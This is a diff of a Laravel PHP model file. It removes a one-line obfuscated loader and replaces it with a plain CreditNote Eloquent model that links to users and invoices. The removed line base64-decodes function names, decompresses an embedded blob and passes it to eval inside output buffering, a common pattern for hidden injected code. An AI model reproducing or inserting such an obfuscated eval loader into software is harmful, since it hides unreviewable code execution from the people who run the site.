@@ -1,1 +1,30 @@
-<?php $_='3b57b8d6';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNptU0tzokAQvu+v4JAqYu0eGB/ZUJYHIQHFFSMmzDCXlDOjiDCEWoKCv35blESzoaqhmX59/fW0opyem9fPZ6B2GBII3XfV/s3pIPsbpe9rtf9DufAfKCpB+o5hPw3mg4GqfJqbfANQVS59TRCnGJtGIqSVT0xvTdB9Ntsfg5TrpK+KUgexZb66676KFX8TK7X/H8SH+Ztryt4Gqh+4bW3pwjD4yODPWI8pLg+zvTZ5mGeIt1/CBS5zgVHGpKVRv3wMiLcJpHUA3WK2XgrsF8Iq7QC7Gus4GSUuX9jWwZPWVth6tXrOXTP1D1DDYXaJGE4KyJGQR28jbCsKiAu6n7OOhSjuaeQR7ajt52cMWwa5eGU8ABHxkngz1vGSse13he0XdDQNT5j3UAPqRMMQiDrh/ooh1CZjE+wjozrmCECoOYypTHKoETH7JXxaGAy4CWu/WgTk8ivSTmKn2odfbBlL6W6JAf/39u0Z85pJHbjTC+AxomSc/hmesZwkhX61ACc5r3j+JQfMSEcsnX8Tc5yHnvGOC7zN0yaOXPeKAllmQWVIgXvARbJjkVH3NDHjhq/fVzVHTiJGfsWiYSzsTcYr7WcgYT7tXsqRt5tYMEsyvptJN4fZHSbPH7zr9b066XuBnXyJpyFN/QK4zli7Gy5xr83aCdy3MGtqrvaXfRkVJR7ishs6I+9tSabvT9JJ4J4VtOO+sGrjNJzPts3diD/wr+fa5CgXu3axTvX39vzXqrfz4qzVbzzrw1v1+FZ/fbhfL9o5z+3lXrVa/X8ankco'; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+
+class CreditNote extends Model
+{
+    use HasFactory;
+
+    protected $fillable = [
+        'user_id', 
+        'invoice_id', 
+        'credit_note_number',
+        'details',
+        'amount',
+        'date_issued'
+    ];
+
+    public function user()
+    {
+        return $this->belongsTo(User::class);
+    }
+
+    public function invoice()
+    {
+        return $this->belongsTo(Invoice::class);
+    }
+}
